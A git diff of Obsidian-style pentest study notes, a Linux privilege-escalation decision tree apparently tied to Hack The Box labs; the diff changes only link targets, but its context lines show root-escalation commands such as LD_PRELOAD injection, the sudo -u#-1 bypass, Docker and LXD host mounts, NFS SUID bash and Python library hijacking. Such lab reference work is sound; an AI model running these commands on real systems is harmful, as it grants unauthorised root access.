@@ -1,6 +1,6 @@
 # Linux Privilege Escalation, Decision Tree
 
-Part of [[DECISION TREE]]. Symptom-to-technique lookup for Linux privesc. Full walkthroughs: [[Linux Privilege Escalation]]. Commands: [[Linux Privilege Escalation (Command Appendix)]].
+Part of [[DECISION TREE]]. Symptom-to-technique lookup for Linux privesc. Full walkthroughs: [[18. Linux Privilege Escalation|Linux Privilege Escalation]]. Commands: [[Linux Privilege Escalation]].
 
 ---
 
@@ -145,7 +145,7 @@ awk available?
   awk 'BEGIN {system("/bin/bash")}'
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.5. Escaping Restricted Shells|LPE.5]], [[Linux Privilege Escalation#Restricted Shell Escape (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.5]], [[18. Linux Privilege Escalation#Restricted Shell Escape (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -164,7 +164,7 @@ sudo LD_PRELOAD=/tmp/privesc.so <any-allowed-binary>
 → Root bash before the binary even loads
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.17. Shared Libraries (LD_PRELOAD)|LPE.17]], [[Linux Privilege Escalation#LD_PRELOAD Shared Library Injection (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.17]], [[18. Linux Privilege Escalation#LD_PRELOAD Shared Library Injection (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -181,7 +181,7 @@ sudo -u#-1 /usr/bin/some_binary
 → UID -1 is mishandled → maps to UID 0 = root
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.20. Sudo User ID -1 Bypass (CVE-2019-14287)|LPE.20]], [[Linux Privilege Escalation#Sudo -u#-1 Bypass. CVE-2019-14287 (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.20]], [[18. Linux Privilege Escalation#Sudo -u#-1 Bypass. CVE-2019-14287 (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -198,7 +198,7 @@ Wait for root to run the script (or trigger it)
 → Root runs your fake binary
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.4. Path Abuse|LPE.4]], [[Linux Privilege Escalation#Path Abuse (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.4]], [[18. Linux Privilege Escalation#Path Abuse (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -218,7 +218,7 @@ lxc start + lxc exec /bin/sh
 → Read /mnt/root/root/ directly
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.12. LXD Privilege Escalation|LPE.12]], [[Linux Privilege Escalation#LXD Container Escape (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.12]], [[18. Linux Privilege Escalation#LXD Container Escape (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -234,7 +234,7 @@ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 → Read /root/flag.txt or plant SUID bash
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.13. Docker Privilege Escalation|LPE.13]], [[Linux Privilege Escalation#Docker Group Escape (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.13]], [[18. Linux Privilege Escalation#Docker Group Escape (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -252,7 +252,7 @@ On target:
 /share/rootbash -p → root
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.15. NFS No Root Squash|LPE.15]], [[Linux Privilege Escalation#NFS No Root Squash (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.15]], [[18. Linux Privilege Escalation#NFS No Root Squash (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -269,7 +269,7 @@ Write malicious .so with constructor attribute to /development/lib/
 Run /opt/binary → your .so loads first → root
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.18. Shared Object Hijacking|LPE.18]], [[Linux Privilege Escalation#Shared Object Hijacking (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.18]], [[18. Linux Privilege Escalation#Shared Object Hijacking (HTB Supplementary)|Command Appendix]].
 
 ---
 
@@ -288,7 +288,7 @@ Append: import os; os.system("chmod +s /bin/bash")
 sudo python3 /opt/script.py → /bin/bash -p → root
 ```
 
-See [[Linux Privilege Escalation (HTB Supplementary)#LPE.19. Python Library Hijacking|LPE.19]], [[Linux Privilege Escalation#Python Library Hijacking (HTB Supplementary)|Command Appendix]].
+See [[18. Linux Privilege Escalation|LPE.19]], [[18. Linux Privilege Escalation#Python Library Hijacking (HTB Supplementary)|Command Appendix]].
 
 ---
 
